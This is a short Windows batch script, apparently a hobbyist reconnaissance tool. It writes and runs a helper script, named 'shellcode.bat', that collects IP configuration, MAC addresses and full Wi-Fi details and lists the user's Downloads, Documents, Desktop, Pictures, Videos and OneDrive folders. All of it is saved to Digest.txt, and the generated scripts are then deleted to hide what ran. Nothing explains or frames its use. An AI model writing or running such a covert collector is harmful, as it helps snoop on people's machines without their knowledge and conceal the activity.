@ECHO OFF
cd\
cd %Userprofile%
cd Downloads
echo @echo off >shellcode.bat
echo CD\ >>shellcode.bat
echo IPCONFIG >>shellcode.bat
echo GETMAC >>shellcode.bat
echo netsh wlan show all >>shellcode.bat
echo CD Users >>shellcode.bat
echo Dir >>shellcode.bat
echo CD %Userprofile% >>shellcode.bat 
echo CD Downloads >>shellcode.bat
echo Dir >>shellcode.bat
echo CD.. >>shellcode.bat
echo CD Documents >>shellcode.bat
echo Dir >>shellcode.bat
echo CD.. >>shellcode.bat
echo CD Desktop >>shellcode.bat
echo Dir >>shellcode.bat
echo CD.. >>shellcode.bat
echo CD Pictures >>shellcode.bat
echo Dir >>shellcode.bat
echo CD.. >>shellcode.bat
echo CD Videos >>shellcode.bat
echo Dir >>shellcode.bat
echo CD.. >>shellcode.bat
echo CD OneDrive >>shellcode.bat
echo Dir >>shellcode.bat
echo CD Documents >>shellcode.bat
echo Dir >>shellcode.bat
echo CD.. >>shellcode.bat
echo CD Pictures >>shellcode.bat
echo Dir >>shellcode.bat
echo CD.. >>shellcode.bat
echo CD Attachments >>shellcode.bat
echo Dir >>shellcode.bat
echo @echo off >execute_shellcode.bat
echo %Userprofile%\Downloads\shellcode.bat >>execute_shellcode.bat
execute_shellcode.bat >Digest.txt
cd\
cd %Userprofile%
cd Downloads
del shellcode.bat
del execute_shellcode.bat
exit
 

